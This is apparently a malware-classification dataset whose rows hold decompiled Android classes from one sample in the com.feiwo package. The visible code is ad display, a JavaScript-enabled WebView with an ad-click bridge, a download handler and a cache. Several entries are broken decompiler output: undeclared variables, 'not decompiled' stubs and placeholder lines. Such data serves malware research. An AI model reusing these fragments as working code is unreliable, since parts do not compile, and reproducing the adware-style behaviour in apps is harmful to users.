newTypeHierarchyFactory(  Class<?> cls,  Object obj){     return new SingleTypeFactory(obj,null,false,cls);   }   @Override public T read2(  JsonReader jsonReader){     if (this.deserializer == null) {       return delegate().read2(jsonReader);     }     JsonElement parse=Streams.parse(jsonReader);     if (parse.isJsonNull()) {       return null;     }     return this.deserializer.deserialize(parse,this.typeToken.getType(),this.gson.deserializationContext);   }   @Override public void write(  JsonWriter jsonWriter,  T t){     if (this.serializer == null) {       delegate().write(jsonWriter,t);     }  else     if (t == null) {       jsonWriter.nullValue();     }  else {       Streams.write(this.serializer.serialize(t,this.typeToken.getType(),this.gson.serializationContext),jsonWriter);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\TypeAdapter.code","public abstract class TypeAdapter<T> {   public final T fromJson(  Reader reader){     return read2(new JsonReader(reader));   }   public final T fromJson(  String str){     return fromJson(new StringReader(str));   }   public final T fromJsonTree(  JsonElement jsonElement){     try {       return read2(new JsonTreeReader(jsonElement));     }  catch (    IOException e) {       throw new JsonIOException(e);     }   }   public final TypeAdapter<T> nullSafe(){     return new TypeAdapter<T>(){       @Override public T read2(      JsonReader jsonReader){         if (jsonReader.peek() != JsonToken.NULL) {           return (T)TypeAdapter.this.read2(jsonReader);         }         jsonReader.nextNull();         return null;       }       @Override public void write(      JsonWriter jsonWriter,      T t){         if (t == null) {           jsonWriter.nullValue();         }  else {           TypeAdapter.this.write(jsonWriter,t);         }       }     } ;   }   public abstract T read2(  JsonReader jsonReader);   public final String toJson(  T t){     StringWriter stringWriter=new StringWriter();     toJson(stringWriter,t);     return stringWriter.toString();   }   public final void toJson(  Writer writer,  T t){     write(new JsonWriter(writer),t);   }   public final JsonElement toJsonTree(  T t){     try {       JsonTreeWriter jsonTreeWriter=new JsonTreeWriter();       write(jsonTreeWriter,t);       return jsonTreeWriter.get();     }  catch (    IOException e) {       throw new JsonIOException(e);     }   }   public abstract void write(  JsonWriter jsonWriter,  T t); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\TypeAdapterFactory.code","public interface TypeAdapterFactory {   <T>TypeAdapter<T> create(  Gson gson,  TypeToken<T> typeToken); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.a\a.code","public class a extends BaseAdapter {   private Context f53a;   private List<AppWallAdInfo> f54b;   private HashMap<Integer,View> c=new HashMap<>();   public a(  Context context,  List<AppWallAdInfo> list){     this.f53a=context;     this.f54b=list;   }   @Override public int getCount(){     return this.f54b.size();   }   @Override public Object getItem(  int i){     return this.f54b.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     View view2=this.c.get(Integer.valueOf(i));     AppWallAdInfo appWallAdInfo=this.f54b.get(i);     View view3=view2;     if (view2 == null) {       c cVar=new c();       RelativeLayout relativeLayout=new RelativeLayout(this.f53a);       relativeLayout.setLayoutParams(new AbsListView.LayoutParams(-1,com.feiwo.i.b.e.a(this.f53a,66.0f)));       relativeLayout.setBackgroundColor(0);       cVar.f57a=new ImageView(this.f53a);       cVar.f57a.setId(39312);       RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(com.feiwo.i.b.e.a(this.f53a,40.0f),com.feiwo.i.b.e.a(this.f53a,40.0f));       layoutParams.addRule(15);       layoutParams.setMargins(com.feiwo.i.b.e.a(this.f53a,13.3f),0,0,0);       cVar.f57a.setLayoutParams(layoutParams);       cVar.d=new ImageView(this.f53a);       cVar.d.setId(39313);       RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(com.feiwo.i.b.e.a(this.f53a,10.6f),com.feiwo.i.b.e.a(this.f53a,18.6f));       layoutParams2.addRule(15);       layoutParams2.addRule(11);       layoutParams2.setMargins(0,0,com.feiwo.i.b.e.a(this.f53a,13.3f),0);       cVar.d.setLayoutParams(layoutParams2);       cVar.f58b=new TextView(this.f53a);       cVar.f58b.setId(39314);       RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(-2,-2);       layoutParams3.addRule(0,39313);       layoutParams3.addRule(1,39312);       layoutParams3.addRule(6,39312);       layoutParams3.setMargins(com.feiwo.i.b.e.a(this.f53a,13.3f),com.feiwo.i.b.e.a(this.f53a,2.0f),com.feiwo.i.b.e.a(this.f53a,13.3f),0);       cVar.f58b.setLayoutParams(layoutParams3);       cVar.f58b.setSingleLine();       cVar.f58b.setTextColor(Color.rgb(76,76,76));       cVar.f58b.setTextSize(18.6f);       cVar.c=new TextView(this.f53a);       cVar.c.setId(39315);       RelativeLayout.LayoutParams layoutParams4=new RelativeLayout.LayoutParams(-2,-2);       layoutParams4.addRule(0,39313);       layoutParams4.addRule(1,39312);       layoutParams4.addRule(3,39314);       layoutParams4.setMargins(com.feiwo.i.b.e.a(this.f53a,13.3f),0,com.feiwo.i.b.e.a(this.f53a,13.3f),0);       cVar.c.setLayoutParams(layoutParams4);       cVar.c.setSingleLine();       cVar.c.setTextSize(12.0f);       cVar.c.setTextColor(Color.rgb(102,102,102));       cVar.e=new ImageView(this.f53a);       RelativeLayout.LayoutParams layoutParams5=new RelativeLayout.LayoutParams(com.feiwo.i.b.e.a(this.f53a,4.0f),-1);       layoutParams5.addRule(9);       cVar.e.setLayoutParams(layoutParams5);       relativeLayout.addView(cVar.f57a);       relativeLayout.addView(cVar.d);       relativeLayout.addView(cVar.f58b);       relativeLayout.addView(cVar.c);       relativeLayout.addView(cVar.e);       if (appWallAdInfo.getIcon() != null) {         com.feiwo.i.b.a.a().a(this.f53a,ReDictory.x().w(),appWallAdInfo.getIcon(),new b(this,cVar));       }       cVar.d.setBackgroundDrawable(com.feiwo.i.b.f.a(this.f53a,com.feiwo.i.c.a.ci));       cVar.f58b.setText(appWallAdInfo.getAppName());       cVar.c.setText(appWallAdInfo.getRecommend()); switch (i % 7) { case 0:         cVar.e.setBackgroundColor(Color.rgb(230,69,74));       break; case 1:     cVar.e.setBackgroundColor(Color.rgb(230,163,69));   break; case 2: cVar.e.setBackgroundColor(Color.rgb(229,230,69)); break; case 3: cVar.e.setBackgroundColor(Color.rgb(69,230,69)); break; case 4: cVar.e.setBackgroundColor(Color.rgb(69,230,176)); break; case 5: cVar.e.setBackgroundColor(Color.rgb(69,122,230)); break; case 6: cVar.e.setBackgroundColor(Color.rgb(176,69,230)); break; } this.c.put(Integer.valueOf(i),relativeLayout); view3=relativeLayout; } return view3; } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.a\b.code","class b implements com.feiwo.i.b.d {   final c f55a;   final a f56b;   public b(  a aVar,  c cVar){     this.f56b=aVar;     this.f55a=cVar;   }   @Override public void a(  Drawable drawable,  String str){     if (drawable != null) {       this.f55a.f57a.setBackgroundDrawable(drawable);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.a\c.code","class c {   public ImageView f57a;   public TextView f58b;   public TextView c;   public ImageView d;   public ImageView e; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.a\d.code","public class d extends BaseAdapter {   private Context f59a;   private List<AppWallAdInfo> f60b;   private int c;   private HashMap<Integer,View> d=new HashMap<>();   private HashMap<Integer,Boolean> e=new HashMap<>();   public d(  Context context,  List<AppWallAdInfo> list,  int i){     this.f59a=context;     this.f60b=list;     this.c=i;     if (i == 1) {       for (int i2=0; i2 < list.size(); i2++) {         a(Integer.valueOf(i2),Boolean.valueOf(list.get(i2).getHasBoundAd() == 1));       }       return;     }     for (int i3=0; i3 < list.size(); i3++) {       a(Integer.valueOf(i3),false);     }   }   public void a(){     if (this.f60b == null || this.f60b.size() == 0 || this.f59a == null) {       return;     }     int i=0;     while (true) {       int i2=i;       if (i2 >= this.e.size()) {         return;       }       if (this.e.get(Integer.valueOf(i2)).booleanValue()) {         h.a(this.f59a).a(5,ReDictory.x().w(),this.f60b.get(i2),null);       }       i=i2 + 1;     }   }   public void a(  Integer num,  Boolean bool){     this.e.put(num,bool);   }   @Override public int getCount(){     return this.f60b.size();   }   @Override public Object getItem(  int i){     return this.f60b.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     g gVar;     View view2;     AppWallAdInfo appWallAdInfo=this.f60b.get(i);     if (view == null) {       g gVar2=new g();       RelativeLayout relativeLayout=new RelativeLayout(this.f59a);       relativeLayout.setLayoutParams(new AbsListView.LayoutParams(-1,com.feiwo.i.b.e.a(this.f59a,66.0f)));       relativeLayout.setBackgroundColor(0);       gVar2.f64a=new ImageView(this.f59a);       gVar2.f64a.setId(39312);       RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(com.feiwo.i.b.e.a(this.f59a,40.0f),com.feiwo.i.b.e.a(this.f59a,40.0f));       layoutParams.addRule(15);       layoutParams.setMargins(com.feiwo.i.b.e.a(this.f59a,13.3f),0,0,0);       gVar2.f64a.setLayoutParams(layoutParams);       gVar2.d=new TextView(this.f59a);       gVar2.d.setId(39313);       RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(com.feiwo.i.b.e.a(this.f59a,44.0f),com.feiwo.i.b.e.a(this.f59a,21.3f));       layoutParams2.addRule(15);       layoutParams2.addRule(11);       layoutParams2.setMargins(0,0,com.feiwo.i.b.e.a(this.f59a,13.3f),0);       gVar2.d.setLayoutParams(layoutParams2);       gVar2.d.setText(""è¯¦æƒ…"");       gVar2.d.setTextSize(10.6f);       gVar2.d.setTextColor(Color.rgb(MotionEventCompat.ACTION_MASK,MotionEventCompat.ACTION_MASK,MotionEventCompat.ACTION_MASK));       gVar2.d.setBackgroundColor(Color.rgb(83,189,76));       gVar2.d.setGravity(17);       gVar2.e=new TextView(this.f59a);       gVar2.e.setId(39316);       RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(com.feiwo.i.b.e.a(this.f59a,42.6f),com.feiwo.i.b.e.a(this.f59a,42.6f));       layoutParams3.addRule(15);       layoutParams3.addRule(0,39313);       gVar2.e.setLayoutParams(layoutParams3);       gVar2.f65b=new TextView(this.f59a);       gVar2.f65b.setId(39314);       RelativeLayout.LayoutParams layoutParams4=new RelativeLayout.LayoutParams(-2,-2);       layoutParams4.addRule(0,39316);       layoutParams4.addRule(1,39312);       layoutParams4.addRule(6,39312);       layoutParams4.setMargins(com.feiwo.i.b.e.a(this.f59a,13.3f),com.feiwo.i.b.e.a(this.f59a,2.0f),0,0);       gVar2.f65b.setLayoutParams(layoutParams4);       gVar2.f65b.setSingleLine();       gVar2.f65b.setTextColor(Color.rgb(76,76,76));       gVar2.f65b.setTextSize(18.6f);       gVar2.c=new TextView(this.f59a);       gVar2.c.setId(39315);       RelativeLayout.LayoutParams layoutParams5=new RelativeLayout.LayoutParams(-2,-2);       layoutParams5.addRule(0,39316);       layoutParams5.addRule(1,39312);       layoutParams5.addRule(3,39314);       layoutParams5.setMargins(com.feiwo.i.b.e.a(this.f59a,13.3f),0,0,0);       gVar2.c.setLayoutParams(layoutParams5);       gVar2.c.setSingleLine();       gVar2.c.setTextSize(12.0f);       gVar2.c.setTextColor(Color.rgb(102,102,102));       relativeLayout.addView(gVar2.f64a);       relativeLayout.addView(gVar2.d);       relativeLayout.addView(gVar2.e);       relativeLayout.addView(gVar2.f65b);       relativeLayout.addView(gVar2.c);       relativeLayout.setTag(gVar2);       gVar=gVar2;       view2=relativeLayout;     }  else {       gVar=(g)view.getTag();       view2=view;     }     gVar.e.setTag(Integer.valueOf(i));     gVar.e.setOnClickListener(new e(this));     if (this.e.get(Integer.valueOf(i)).booleanValue()) {       gVar.e.setBackgroundDrawable(com.feiwo.i.b.f.a(this.f59a,com.feiwo.i.c.a.cs));     }  else {       gVar.e.setBackgroundDrawable(com.feiwo.i.b.f.a(this.f59a,com.feiwo.i.c.a.cr));     }     if (appWallAdInfo.getIcon() != null) {       com.feiwo.i.b.a.a().a(this.f59a,ReDictory.x().w(),appWallAdInfo.getIcon(),new f(this,gVar.f64a));     }     gVar.f65b.setText(appWallAdInfo.getAppName());     gVar.c.setText(appWallAdInfo.getRecommend());     return view2;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.a\e.code","class e implements View.OnClickListener {   final d f61a;   public e(  d dVar){     this.f61a=dVar;   }   @Override public void onClick(  View view){     HashMap hashMap;     int intValue=((Integer)view.getTag()).intValue();     hashMap=this.f61a.e;     if (((Boolean)hashMap.get(Integer.valueOf(intValue))).booleanValue()) {       this.f61a.a(Integer.valueOf(intValue),false);     }  else {       this.f61a.a(Integer.valueOf(intValue),true);     }     this.f61a.notifyDataSetChanged();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.a\f.code","class f implements com.feiwo.i.b.d {   final ImageView f62a;   final d f63b;   public f(  d dVar,  ImageView imageView){     this.f63b=dVar;     this.f62a=imageView;   }   @Override public void a(  Drawable drawable,  String str){     if (drawable != null) {       this.f62a.setBackgroundDrawable(drawable);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.a\g.code","class g {   public ImageView f64a;   public TextView f65b;   public TextView c;   public TextView d;   public TextView e; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.activity\a.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2e236fb8"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.activity\b.code","public class b implements com.feiwo.i.b.d {   final DA f73a;   public b(  DA da){     this.f73a=da;   }   @Override public void a(  Drawable drawable,  String str){     if (drawable != null) {       this.f73a.y=drawable;       this.f73a.d.setBackgroundDrawable(drawable);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.activity\BA.code","public class BA extends Activity {   @Override public void onCreate(  Bundle bundle){     super.onCreate(bundle);     requestWindowFeature(1);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.activity\c.code","public class c extends BaseAdapter {   final DA f74a;   private HashMap<Integer,View> f75b=new HashMap<>();   private RelativeLayout.LayoutParams c;   private RelativeLayout.LayoutParams d;   public c(  DA da){     this.f74a=da;     this.c=new RelativeLayout.LayoutParams(com.feiwo.i.b.e.a(this.f74a,147.0f),com.feiwo.i.b.e.a(this.f74a,244.0f));     this.d=new RelativeLayout.LayoutParams(com.feiwo.i.b.e.a(this.f74a,147.0f),com.feiwo.i.b.e.a(this.f74a,244.0f));   }   @Override public int getCount(){     List list;     list=this.f74a.K;     return list.size();   }   @Override public Object getItem(  int i){     List list;     list=this.f74a.K;     return list.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     List list;     View view2=this.f75b.get(Integer.valueOf(i));     if (view2 != null) {       return view2;     }     g gVar=new g();     RelativeLayout relativeLayout=new RelativeLayout(this.f74a);     gVar.f81a=new ImageView(this.f74a);     gVar.f81a.setLayoutParams(this.c);     com.feiwo.i.b.a aVar=this.f74a.x;     DA da=this.f74a;     String str=this.f74a.v;     list=this.f74a.K;     aVar.a(da,str,(String)list.get(i),new d(this,gVar));     relativeLayout.addView(gVar.f81a);     this.f75b.put(Integer.valueOf(i),relativeLayout);     return relativeLayout;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.activity\d.code","class d implements com.feiwo.i.b.d {   final g f76a;   final c f77b;   public d(  c cVar,  g gVar){     this.f77b=cVar;     this.f76a=gVar;   }   @Override public void a(  Drawable drawable,  String str){     if (drawable != null) {       this.f76a.f81a.setBackgroundDrawable(drawable);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.activity\DA.code","!org.eclipse.jdt.core.dom.TypeDeclaration@e1690f1"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.activity\e.code","class e extends BroadcastReceiver {   e(){   }   @Override public void onReceive(  Context context,  Intent intent){     if (DA.this.f66a == null || intent.getIntExtra(com.feiwo.c.a.al,-1) != DA.this.f66a.getAdId().intValue()) {       return;     }     if (intent.getBooleanExtra(com.feiwo.c.a.an,false)) {       DA.this.b(1031,intent.getIntExtra(com.feiwo.c.a.am,100));       return;     }     if (intent.getBooleanExtra(com.feiwo.c.a.ao,false)) {       DA.this.b(1032,intent.getIntExtra(com.feiwo.c.a.am,0));       return;     }     if (intent.getBooleanExtra(com.feiwo.c.a.ap,false)) {       if (!intent.getBooleanExtra(com.feiwo.c.a.aq,false)) {         DA.this.b(1030,intent.getIntExtra(com.feiwo.c.a.am,0));         Toast.makeText(DA.this,com.feiwo.i.c.a.Y,0).show();       }  else {         DA.this.b(1033,intent.getIntExtra(com.feiwo.c.a.am,0));         if (DA.this.w != -1) {           com.feiwo.d.e.a(context,DA.this.w).a(intent.getStringExtra(com.feiwo.c.a.as) + com.feiwo.c.a.au,intent.getStringExtra(com.feiwo.c.a.ar));         }         Toast.makeText(DA.this,com.feiwo.i.c.a.X,0).show();       }     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.activity\f.code","public class f implements View.OnClickListener {   boolean f79a=true;   final DA f80b;   public f(  DA da){     this.f80b=da;   }   @Override public void onClick(  View view){     if (this.f79a) {       this.f79a=false;       this.f80b.i.setEllipsize(null);       this.f80b.i.setMaxLines(50);       this.f80b.l.setText(com.feiwo.i.c.a.aW);       return;     }     this.f79a=true;     this.f80b.i.setEllipsize(TextUtils.TruncateAt.END);     this.f80b.i.setMaxLines(5);     this.f80b.l.setText(com.feiwo.i.c.a.aV);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.activity\g.code","class g {   public ImageView f81a; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.activity\h.code","public class h {   private static h f82b;   private Context f83a;   private Handler c;   private final int d=1031;   private final int e=1032;   private final int f=1033;   private final int g=1030;   private boolean h=false;   private h(  Context context,  Handler handler){     this.f83a=context;     this.c=handler;   }   public static synchronized h a(  Context context,  Handler handler){     h hVar; synchronized (h.class) {       if (f82b == null) {         f82b=new h(context,handler);       }       hVar=f82b;     }     return hVar;   }   public void a(  int i,  int i2){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.activity\j.code","class j implements DownloadListener {   final PA f84a;   private j(  PA pa){     this.f84a=pa;   }   @Override public void onDownloadStart(  String str,  String str2,  String str3,  String str4,  long j){     this.f84a.startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(str)));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.activity\JsInterface.code","public class JsInterface {   private Context f68a;   private AdInfo f69b;   private com.feiwo.d.a.a c;   public JsInterface(  Context context,  AdInfo adInfo,  com.feiwo.d.a.a aVar){     this.f68a=context;     this.f69b=adInfo;     this.c=aVar;   }   @JavascriptInterface public void onAdClicked(){     if (this.c != null) {       this.c.a(this.f68a,this.f69b,7,null);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.activity\k.code","class k extends WebViewClient {   final PA f85a;   private k(  PA pa){     this.f85a=pa;   }   @Override public void onPageFinished(  WebView webView,  String str){   }   @Override public void onPageStarted(  WebView webView,  String str,  Bitmap bitmap){     super.onPageStarted(webView,str,bitmap);     if (PA.a(this.f85a) != null) {       s.a(this.f85a,9999459 + PA.a(this.f85a).getAdId().intValue());     }   }   @Override public void onReceivedError(  WebView webView,  int i,  String str,  String str2){     super.onReceivedError(webView,i,str,str2);   }   @Override public boolean shouldOverrideUrlLoading(  WebView webView,  String str){     webView.loadUrl(str);     return true;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.activity\PA.code","public class PA extends Activity {   public static final String f70a=com.feiwo.i.c.a.bz;   public static final String f71b=com.feiwo.i.c.a.bA;   public static final String c=com.feiwo.i.c.a.bB;   public static final String d=com.feiwo.i.c.a.bC;   private final String e=PA.class.getSimpleName();   private AdInfo f;   private void a(  IntentData intentData){     startActivity(b(intentData));   }   private Intent b(  IntentData intentData){     return q.b(getApplicationContext(),intentData.getAppDir());   }   @Override protected void onCreate(  Bundle bundle){     com.feiwo.d.a.a aVar;     super.onCreate(bundle);     requestWindowFeature(1);     if (getIntent() == null) {       finish();       return;     }     IntentData intentData=(IntentData)getIntent().getSerializableExtra(com.feiwo.i.a.f156a);     if (intentData == null) {       finish();       return;     }     com.feiwo.d.e<?> c2=com.feiwo.d.e.c(this,intentData.getAdType());     if (c2 != null) {       aVar=c2.e;       aVar.b(this);     }  else {       com.feiwo.d.e eVar=(com.feiwo.d.e)com.feiwo.d.e.b(this,intentData.getAdType());       if (eVar != null) {         com.feiwo.d.e.a(this,eVar,intentData.getAdType());         com.feiwo.d.e.a(intentData.getAdType(),(com.feiwo.d.e<?>)eVar);         aVar=com.feiwo.d.e.c(this,intentData.getAdType());       }  else {         aVar=null;       }     }     String type=intentData.getType();     intentData.getAppDir();     this.f=intentData.getAdInfo();     if (this.f == null) {       finish();       return;     }     if (type.equals(com.feiwo.i.a.f157b)) {       finish();       a(intentData);       com.feiwo.b.a.f a2=com.feiwo.d.e.a(this);       GlobalInfo b2=com.feiwo.d.e.b(com.feiwo.d.e.a(this));       if (b2.downloadAppInfo.get(this.f.getPackageName()) == null) {         AppInfo appInfo=new AppInfo(intentData.getAdType());         appInfo.setAdInfo(this.f);         b2.downloadAppInfo.put(this.f.getPackageName(),appInfo);         com.feiwo.d.e.a(a2,b2);         return;       }       return;     }     if (!type.equals(com.feiwo.i.a.c)) {       if (!type.equals(com.feiwo.i.a.d)) {         if (type.equals(com.feiwo.i.a.e)) {           finish();           return;         }  else {           finish();           return;         }       }       finish();       if (this.f != null && intentData.isSendClick()) {         com.feiwo.d.e.a(this,intentData.getAdType(),this.f,this.f.getAdId(),4,null);       }       com.feiwo.i.h.a(this).a(intentData.getAdType(),intentData.getBaseUrl(),intentData.getAdInfo(),new com.feiwo.i.i());       if (intentData.getAdType() == 1) {         s.a(this,9999459 + this.f.getAdId().intValue());         return;       }       return;     }     if (intentData.getAdType() == 1 && aVar != null) {       aVar.a(this,this.f,4,null);     }     String url=this.f.getUrl();     if (url == null) {       finish();       return;     }     if (!url.startsWith(com.feiwo.c.a.d)) {       url=com.feiwo.c.a.d + url;     }     LinearLayout linearLayout=new LinearLayout(this);     linearLayout.setOrientation(1);     linearLayout.setLayoutParams(new ViewGroup.LayoutParams(-1,-1));     WebView webView=new WebView(this);     webView.setLayoutParams(new LinearLayout.LayoutParams(-1,-1,1.0f));     webView.getSettings().setJavaScriptEnabled(true);     webView.addJavascriptInterface(new JsInterface(this,this.f,aVar),com.feiwo.c.a.q);     webView.loadUrl(url);     webView.setWebViewClient(new k(this));     webView.setDownloadListener(new j(this));     linearLayout.addView(webView);     setContentView(linearLayout);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.annotations\packageinfo.code","interface packageinfo { } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.b.a\a.code","public class a {   private static Map<String,a> f87a=new HashMap();   private c f88b;   private a(  File file,  long j,  int i){     if (!file.exists() && !file.mkdirs()) {       throw new RuntimeException(""can't make dirs in "" + file.getAbsolutePath());     }     this.f88b=new c(this,file,j,i);   }   public static a a(  Context context,  String str){     return a(new File(context.getCacheDir(),str),50000000L,Integer.MAX_VALUE);   }   public static a a(  File file,  long j,  int i){     a aVar=f87a.get(file.getAbsoluteFile() + a());     if (aVar != null) {       return aVar;     }     a aVar2=new a(file,j,i);     f87a.put(file.getAbsolutePath() + a(),aVar2);     return aVar2;   }   private static String a(){     return ""_"" + Process.myPid();   }   private String d(  String str){     File a2;     BufferedReader bufferedReader;     boolean c;     int b2;     byte[] b3;     a2=this.f88b.a(str);     exists=a2.exists();     try {       if (exists == 0) {         return null;       }       try {         bufferedReader=new BufferedReader(new FileReader(a2));         String str2="""";         while (true) {           try {             String readLine=bufferedReader.readLine();             if (readLine == null) {               break;             }             str2=str2 + readLine;           }  catch (          IOException e) {             e=e;             e.printStackTrace();             if (bufferedReader == null) {               return null;             }             try {               bufferedReader.close();               return null;             }  catch (            IOException e2) {               e2.printStackTrace();               return null;             }           }         }         byte[] bytes=str2.getBytes();         c=e.c(bytes);         if (!c) {           if (bufferedReader == null) {             return null;           }           try {             bufferedReader.close();             return null;           }  catch (          IOException e3) {             e3.printStackTrace();             return null;           }         }         b2=e.b(bytes,' ');         b3=e.b(bytes,0,b2);         String str3=new String(b3);         if (bufferedReader != null) {           try {             bufferedReader.close();           }  catch (          IOException e4) {             e4.printStackTrace();           }         }         return str3;       }  catch (      IOException e5) {         e=e5;         bufferedReader=null;       } catch (      Throwable th) {         exists=0;         th=th;         if (exists != 0) {           try {             exists.close();           }  catch (          IOException e6) {             e6.printStackTrace();           }         }         throw th;       }     }  catch (    Throwable th2) {       th=th2;     }   }   public void a(  java.lang.String r6,  java.lang.String r7){     throw new UnsupportedOperationException(""Method not decompiled: com.feiwo.b.a.a.a(java.lang.String, java.lang.String):void"");   }   public void a(  String str,  String str2,  int i){     String b2;     b2=e.b(i,str2);     a(str,b2);   }   public boolean a(  String str){     File a2;     a2=this.f88b.a(str);     return a2.exists();   }   public String b(  String str){     File a2;     BufferedReader bufferedReader;     boolean c;     String str2=null;     a2=this.f88b.a(str);     exists=a2.exists();     try {       if (exists != 0) {         try {           bufferedReader=new BufferedReader(new FileReader(a2));           String str3="""";           while (true) {             try {               String readLine=bufferedReader.readLine();               if (readLine == null) {                 break;               }               str3=str3 + readLine;             }  catch (            IOException e) {               e=e;               e.printStackTrace();               if (bufferedReader != null) {                 try {                   bufferedReader.close();                 }  catch (                IOException e2) {                   e2.printStackTrace();                 }               }               return str2;             }           }           c=e.c(str3);           if (c) {             if (bufferedReader != null) {               try {                 bufferedReader.close();               }  catch (              IOException e3) {                 e3.printStackTrace();               }             }             c(str);           }  else {             str2=e.d(str3);             if (bufferedReader != null) {               try {                 bufferedReader.close();               }  catch (              IOException e4) {                 e4.printStackTrace();               }             }           }         }  catch (        IOException e5) {           e=e5;           bufferedReader=null;         } catch (        Throwable th) {           exists=0;           th=th;           if (exists != 0) {             try {               exists.close();             }  catch (            IOException e6) {               e6.printStackTrace();             }           }           throw th;         }       }       return str2;     }  catch (    Throwable th2) {       th=th2;     }   }   public void b(  java.lang.String r6,  java.lang.String r7,  int r8){     throw new UnsupportedOperationException(""Method not decompiled: com.feiwo.b.a.a.b(java.lang.String, java.lang.String, int):void"");   }   public boolean c(  String str){     boolean c;     c=this.f88b.c(str);     return c;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.b.a\c.code","public class c {   protected File f89a;   final a f90b;   private final AtomicLong c;   private final AtomicInteger d;   private final long e;   private final int f;   private final Map<File,Long> g;   private c(  a aVar,  File file,  long j,  int i){     this.f90b=aVar;     this.g=Collections.synchronizedMap(new HashMap());     this.f89a=file;     this.e=j;     this.f=i;     this.c=new AtomicLong();     this.d=new AtomicInteger();     a();   }   public File a(  String str){     File b2=b(str);     Long valueOf=Long.valueOf(System.currentTimeMillis());     b2.setLastModified(valueOf.longValue());     this.g.put(b2,valueOf);     return b2;   }   private void a(){     new Thread(new d(this)).start();   }   public void a(  File file){     int i=this.d.get();     while (i + 1 > this.f) {       this.c.addAndGet(-b());       i=this.d.addAndGet(-1);     }     this.d.addAndGet(1);     long b2=b(file);     long j=this.c.get();     while (j + b2 > this.e) {       j=this.c.addAndGet(-b());     }     this.c.addAndGet(b2);     Long valueOf=Long.valueOf(System.currentTimeMillis());     file.setLastModified(valueOf.longValue());     this.g.put(file,valueOf);   }   private long b(){     File file;     Long l;     File file2=null;     if (this.g.isEmpty()) {       return 0L;     }     Set<Map.Entry<File,Long>> entrySet=this.g.entrySet(); synchronized (this.g) {       Long l2=null;       for (      Map.Entry<File,Long> entry : entrySet) {         if (file2 == null) {           file=entry.getKey();           l=entry.getValue();         }  else {           Long value=entry.getValue();           if (value.longValue() < l2.longValue()) {             File key=entry.getKey();             l=value;             file=key;           }  else {             file=file2;             l=l2;           }         }         